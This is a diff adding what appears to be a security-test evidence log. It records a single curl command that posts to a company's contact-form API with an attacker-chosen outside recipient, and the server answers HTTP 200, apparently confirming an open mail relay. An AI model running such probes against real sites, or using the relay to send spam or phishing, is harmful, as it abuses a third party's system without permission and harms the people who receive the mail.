@@ -1,0 +1,10 @@
+# command: cd /work/evidence && echo "### T1: attacker-chosen external recipient" && curl -sS -o t1.out -w "HTTP=%{http_code} bytes=%{size_download}\n" -X POST https://www.infinitycapital.bh/api/send -F "fname=Verify" -F "lname=Test" -F "areacode=973" -F "tel=0000000" -F "cname=Independent Verifier" -F "subject=authz probe A" -F "msg=probe A body" -F "check=x" -F "targets=probe-relay-verify-01@guardrailcheck.invalid"; echo "--- body ---"; cat t1.out; echo
+# tool: curl
+# exit_code: 0
+# ts: 2026-09-30T12:05:49.258677+00:00
+# ---
+
+### T1: attacker-chosen external recipient
+HTTP=200 bytes=67
+--- body ---
+{"data":{"id":"01a0f234-e83b-7ed5-82a1-314474f74e14"},"error":null}
